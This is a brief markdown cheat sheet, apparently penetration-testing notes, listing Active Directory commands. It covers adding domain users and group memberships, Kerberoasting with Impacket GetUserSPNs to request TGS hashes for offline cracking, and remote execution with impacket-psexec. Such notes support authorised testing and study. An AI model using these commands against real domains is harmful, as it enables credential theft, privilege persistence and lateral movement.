# Active Directory
Here there is different commands to interact with a domain
## Add User
````powershell
net user <username> <password> /add /domain
````

## Add to domain group
````powershell
net group <Group_Name> <username> /add
````

## Add to local group
````powershell
net localgroup <Group_Name> <username> /add
````
## Add to Remote Management group
Remote Management Users group is to allow users to remotely manage computers with Server Manager and RSAT - PSremoting or WinRM
````powershell
net localgroup "Remote Management Users" <username> /add
````
## GetUserSPNs
Impacket’s GetUserSPNs.py again simplifies the process to find SPNs, and is also able to request the TGS and
extract the hash for offline cracking.
````bash
impacket-GetUserSPNs <domain>/<username> -dc-ip <DC-IP>
````
### Requesting TGS ticket
Requesting a Ticket Granting Service ticket, which is can be cracked offline because the TGS_REP is encrypted using NTLM password hash of the account in whose context the service instance is running.
````bash
impacket-GetUserSPNs <domain>/<username> -dc-ip <DC-IP> -request
````
## PSexec
````bash
impacket-psexec <domain>/<username>:<password>@<IP-ADDRESS>
````
